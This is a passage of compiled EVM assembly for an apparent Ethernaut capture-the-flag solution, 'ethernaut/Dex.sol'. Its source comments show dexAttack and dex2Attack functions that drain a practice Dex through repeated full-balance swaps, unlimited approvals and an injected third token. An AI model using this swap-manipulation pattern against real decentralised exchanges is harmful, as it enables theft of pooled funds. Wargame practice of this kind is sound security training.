*/\n      sload(0x03)\n      0x01\n        /* \"ethernaut/Dex.sol\":1710:1716  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":1700:1703  dex */\n      0x00\n        /* \"ethernaut/Dex.sol\":1718:1724  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":1726:1765  IERC20(token2).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":1759:1763  this */\n      address\n        /* \"ethernaut/Dex.sol\":1726:1765  IERC20(token2).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1700:1703  dex */\n      swap4\n      dup5\n      and\n      swap6\n      pop\n        /* \"ethernaut/Dex.sol\":1695:1709  IDex(dex).swap */\n      0xdf791e50\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":1710:1716  token2 */\n      swap2\n      dup4\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":1718:1724  token1 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1710:1716  token2 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":1726:1750  IERC20(token2).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":1726:1765  IERC20(token2).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_48:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_49\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_49:\n        /* \"ethernaut/Dex.sol\":1695:1766  IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_50\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_50:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_51\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_51:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_53\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_53:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":1781:1784  dex */\n      sload(0x03)\n      0x00\n        /* \"ethernaut/Dex.sol\":1791:1797  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":1781:1784  dex */\n      0x01\n        /* \"ethernaut/Dex.sol\":1799:1805  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":1807:1846  IERC20(token1).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":1840:1844  this */\n      address\n        /* \"ethernaut/Dex.sol\":1807:1846  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1781:1784  dex */\n      swap4\n      dup5\n      and\n      swap6\n      pop\n        /* \"ethernaut/Dex.sol\":1776:1790  IDex(dex).swap */\n      0xdf791e50\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":1791:1797  token1 */\n      swap2\n      dup4\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":1799:1805  token2 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1791:1797  token1 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":1807:1831  IERC20(token1).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":1807:1846  IERC20(token1).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_56\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_56:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_57\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_57:\n        /* \"ethernaut/Dex.sol\":1776:1847  IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_58\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_58:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_59\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_59:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_61\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_61:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":1862:1865  dex */\n      sload(0x03)\n      0x01\n        /* \"ethernaut/Dex.sol\":1872:1878  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":1862:1865  dex */\n      0x00\n        /* \"ethernaut/Dex.sol\":1880:1886  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":1888:1927  IERC20(token2).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":1921:1925  this */\n      address\n        /* \"ethernaut/Dex.sol\":1888:1927  IERC20(token2).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1862:1865  dex */\n      swap4\n      dup5\n      and\n      swap6\n      pop\n        /* \"ethernaut/Dex.sol\":1857:1871  IDex(dex).swap */\n      0xdf791e50\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":1872:1878  token2 */\n      swap2\n      dup4\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":1880:1886  token1 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1872:1878  token2 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":1888:1912  IERC20(token2).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":1888:1927  IERC20(token2).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_64\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_64:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_65\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_65:\n        /* \"ethernaut/Dex.sol\":1857:1928  IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_66\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_66:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_67\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_67:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_69\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_69:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":1943:1946  dex */\n      sload(0x03)\n      0x00\n        /* \"ethernaut/Dex.sol\":1953:1959  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":1943:1946  dex */\n      0x01\n        /* \"ethernaut/Dex.sol\":1961:1967  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":1969:2008  IERC20(token1).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":2002:2006  this */\n      address\n        /* \"ethernaut/Dex.sol\":1969:2008  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1943:1946  dex */\n      swap4\n      dup5\n      and\n      swap6\n      pop\n        /* \"ethernaut/Dex.sol\":1938:1952  IDex(dex).swap */\n      0xdf791e50\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":1953:1959  token1 */\n      swap2\n      dup4\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":1961:1967  token2 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1953:1959  token1 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":1969:1993  IERC20(token1).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":1969:2008  IERC20(token1).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_72\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_72:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_73\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_73:\n        /* \"ethernaut/Dex.sol\":1938:2009  IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_74\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_74:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_75\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_75:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_77\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_77:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":2024:2027  dex */\n      sload(0x03)\n      0x01\n        /* \"ethernaut/Dex.sol\":2034:2040  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":2024:2027  dex */\n      0x00\n        /* \"ethernaut/Dex.sol\":2042:2048  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":2019:2053  IDex(dex).swap(token2, token1, 45) */\n      mload(0x40)\n      shl(0xe4, 0x0df791e5)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":2024:2027  dex */\n      swap4\n      dup5\n      and\n      swap6\n      pop\n        /* \"ethernaut/Dex.sol\":2019:2033  IDex(dex).swap */\n      0xdf791e50\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":2019:2053  IDex(dex).swap(token2, token1, 45) */\n      tag_78\n      swap4\n        /* \"ethernaut/Dex.sol\":2034:2040  token2 */\n      swap3\n      dup4\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":2042:2048  token1 */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":2050:2052  45 */\n      0x2d\n      swap1\n        /* \"ethernaut/Dex.sol\":2019:2053  IDex(dex).swap(token2, token1, 45) */\n      0x04\n      add\n      tag_17\n      jump\t// in\n    tag_78:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_80\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_80:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_82\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_82:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":2203:2209  token3 */\n      sload(0x02)\n        /* \"ethernaut/Dex.sol\":2236:2239  dex */\n      sload(0x03)\n        /* \"ethernaut/Dex.sol\":2196:2244  IERC20(token3).transferFrom(msg.sender, dex, 90) */\n      mload(0x40)\n      shl(0xe0, 0x23b872dd)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":2203:2209  token3 */\n      swap3\n      dup4\n      and\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":2196:2223  IERC20(token3).transferFrom */\n      0x23b872dd\n      swap4\n      pop\n        /* \"ethernaut/Dex.sol\":2196:2244  IERC20(token3).transferFrom(msg.sender, dex, 90) */\n      tag_83\n      swap3\n        /* \"ethernaut/Dex.sol\":2224:2234  msg.sender */\n      caller\n      swap3\n        /* \"ethernaut/Dex.sol\":2236:2239  dex */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":2241:2243  90 */\n      0x5a\n      swap1\n        /* \"ethernaut/Dex.sol\":2196:2244  IERC20(token3).transferFrom(msg.sender, dex, 90) */\n      0x04\n      add\n      tag_17\n      jump\t// in\n    tag_83:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_86\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_86:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_87\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_87:\n      pop\n        /* \"ethernaut/Dex.sol\":2261:2267  token3 */\n      sload(0x02)\n        /* \"ethernaut/Dex.sol\":2254:2312  IERC20(token3).transferFrom(msg.sender, address(this), 90) */\n      mload(0x40)\n      shl(0xe0, 0x23b872dd)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":2261:2267  token3 */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":2254:2281  IERC20(token3).transferFrom */\n      0x23b872dd\n      swap1\n        /* \"ethernaut/Dex.sol\":2254:2312  IERC20(token3).transferFrom(msg.sender, address(this), 90) */\n      tag_88\n      swap1\n        /* \"ethernaut/Dex.sol\":2282:2292  msg.sender */\n      caller\n      swap1\n        /* \"ethernaut/Dex.sol\":2302:2306  this */\n      address\n      swap1\n        /* \"ethernaut/Dex.sol\":2309:2311  90 */\n      0x5a\n      swap1\n        /* \"ethernaut/Dex.sol\":2254:2312  IERC20(token3).transferFrom(msg.sender, address(this), 90) */\n      0x04\n      add\n      tag_17\n      jump\t// in\n    tag_88:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_90\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_90:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_91\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_91:\n      pop\n        /* \"ethernaut/Dex.sol\":2329:2335  token3 */\n      sload(0x02)\n        /* \"ethernaut/Dex.sol\":2345:2348  dex */\n      sload(0x03)\n        /* \"ethernaut/Dex.sol\":2322:2365  IERC20(token3).approve(dex, type(uint).max) */\n      mload(0x40)\n      shl(0xe0, 0x095ea7b3)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":2345:2348  dex */\n      swap2\n      dup3\n      and\n        /* \"ethernaut/Dex.sol\":2322:2365  IERC20(token3).approve(dex, type(uint).max) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1150:1201   */\n      mstore\n      not(0x00)\n        /* \"#utility.yul\":1217:1235   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1210:1244   */\n      mstore\n        /* \"ethernaut/Dex.sol\":2329:2335  token3 */\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":2322:2344  IERC20(token3).approve */\n      0x095ea7b3\n      swap1\n        /* \"#utility.yul\":1123:1141   */\n      0x44\n      add\n        /* \"ethernaut/Dex.sol\":2322:2365  IERC20(token3).approve(dex, type(uint).max) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_94\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_94:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_95\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_95:\n      pop\n        /* \"ethernaut/Dex.sol\":2381:2384  dex */\n      sload(0x03)\n        /* \"ethernaut/Dex.sol\":2391:2397  token3 */\n      sload(0x02)\n        /* \"ethernaut/Dex.sol\":2381:2384  dex */\n      0x01\n        /* \"ethernaut/Dex.sol\":2399:2405  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":2407:2446  IERC20(token3).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":2440:2444  this */\n      address\n        /* \"ethernaut/Dex.sol\":2407:2446  IERC20(token3).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":2381:2384  dex */\n      swap4\n      dup5\n      and\n      swap4\n        /* \"ethernaut/Dex.sol\":2376:2390  IDex(dex).swap */\n      0xdf791e50\n      swap4\n        /* \"ethernaut/Dex.sol\":2391:2397  token3 */\n      dup2\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":2399:2405  token2 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":2391:2397  token3 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":2407:2431  IERC20(token3).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":2407:2446  IERC20(token3).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_98\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_98:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_99\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_99:\n        /* \"ethernaut/Dex.sol\":2376:2447  IDex(dex).swap(token3, token2, IERC20(token3).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_100\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_100:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_101\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_101:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_103\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_103:\n      pop\n      pop\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":1327:2454  function dex2Attack() external {... */\n      jump\t// out\n        /* \"ethernaut/Dex.sol\":587:1319  function dexAttack() external {... */\n    tag_13:\n        /* \"ethernaut/Dex.sol\":634:640  token1 */\n      sload(0x00)\n        /* \"ethernaut/Dex.sol\":627:685  IERC20(token1).transferFrom(msg.sender, address(this), 10) */\n      mload(0x40)\n      shl(0xe0, 0x23b872dd)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":634:640  token1 */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":627:654  IERC20(token1).transferFrom */\n      0x23b872dd\n      swap1\n        /* \"ethernaut/Dex.sol\":627:685  IERC20(token1).transferFrom(msg.sender, address(this), 10) */\n      tag_105\n      swap1\n        /* \"ethernaut/Dex.sol\":655:665  msg.sender */\n      caller\n      swap1\n        /* \"ethernaut/Dex.sol\":675:679  this */\n      address\n      swap1\n        /* \"ethernaut/Dex.sol\":682:684  10 */\n      0x0a\n      swap1\n        /* \"ethernaut/Dex.sol\":627:685  IERC20(token1).transferFrom(msg.sender, address(this), 10) */\n      0x04\n      add\n      tag_17\n      jump\t// in\n    tag_105:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_107\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_107:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_108\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_108:\n      pop\n        /* \"ethernaut/Dex.sol\":702:708  token2 */\n      sload(0x01)\n        /* \"ethernaut/Dex.sol\":695:753  IERC20(token2).transferFrom(msg.sender, address(this), 10) */\n      mload(0x40)\n      shl(0xe0, 0x23b872dd)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":702:708  token2 */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":695:722  IERC20(token2).transferFrom */\n      0x23b872dd\n      swap1\n        /* \"ethernaut/Dex.sol\":695:753  IERC20(token2).transferFrom(msg.sender, address(this), 10) */\n      tag_109\n      swap1\n        /* \"ethernaut/Dex.sol\":723:733  msg.sender */\n      caller\n      swap1\n        /* \"ethernaut/Dex.sol\":743:747  this */\n      address\n      swap1\n        /* \"ethernaut/Dex.sol\":750:752  10 */\n      0x0a\n      swap1\n        /* \"ethernaut/Dex.sol\":695:753  IERC20(token2).transferFrom(msg.sender, address(this), 10) */\n      0x04\n      add\n      tag_17\n      jump\t// in\n    tag_109:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_111\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_111:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_112\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_112:\n      pop\n        /* \"ethernaut/Dex.sol\":771:777  token1 */\n      sload(0x00)\n        /* \"ethernaut/Dex.sol\":787:790  dex */\n      sload(0x03)\n        /* \"ethernaut/Dex.sol\":764:807  IERC20(token1).approve(dex, type(uint).max) */\n      mload(0x40)\n      shl(0xe0, 0x095ea7b3)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":787:790  dex */\n      swap2\n      dup3\n      and\n        /* \"ethernaut/Dex.sol\":764:807  IERC20(token1).approve(dex, type(uint).max) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1150:1201   */\n      mstore\n      not(0x00)\n        /* \"#utility.yul\":1217:1235   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1210:1244   */\n      mstore\n        /* \"ethernaut/Dex.sol\":771:777  token1 */\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":764:786  IERC20(token1).approve */\n      0x095ea7b3\n      swap1\n        /* \"#utility.yul\":1123:1141   */\n      0x44\n      add\n        /* \"ethernaut/Dex.sol\":764:807  IERC20(token1).approve(dex, type(uint).max) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_115\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_115:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_116\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_116:\n      pop\n        /* \"ethernaut/Dex.sol\":824:830  token2 */\n      sload(0x01)\n        /* \"ethernaut/Dex.sol\":840:843  dex */\n      sload(0x03)\n        /* \"ethernaut/Dex.sol\":817:860  IERC20(token2).approve(dex, type(uint).max) */\n      mload(0x40)\n      shl(0xe0, 0x095ea7b3)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":840:843  dex */\n      swap2\n      dup3\n      and\n        /* \"ethernaut/Dex.sol\":817:860  IERC20(token2).approve(dex, type(uint).max) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1150:1201   */\n      mstore\n      not(0x00)\n        /* \"#utility.yul\":1217:1235   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1210:1244   */\n      mstore\n        /* \"ethernaut/Dex.sol\":824:830  token2 */\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":817:839  IERC20(token2).approve */\n      0x095ea7b3\n      swap1\n        /* \"#utility.yul\":1123:1141   */\n      0x44\n      add\n        /* \"ethernaut/Dex.sol\":817:860  IERC20(token2).approve(dex, type(uint).max) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_119\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_119:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_120\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_120:\n      pop\n        /* \"ethernaut/Dex.sol\":876:879  dex */\n      sload(0x03)\n      0x00\n        /* \"ethernaut/Dex.sol\":886:892  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":876:879  dex */\n      0x01\n        /* \"ethernaut/Dex.sol\":894:900  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":902:941  IERC20(token1).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":935:939  this */\n      address\n        /* \"ethernaut/Dex.sol\":902:941  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":876:879  dex */\n      swap4\n      dup5\n      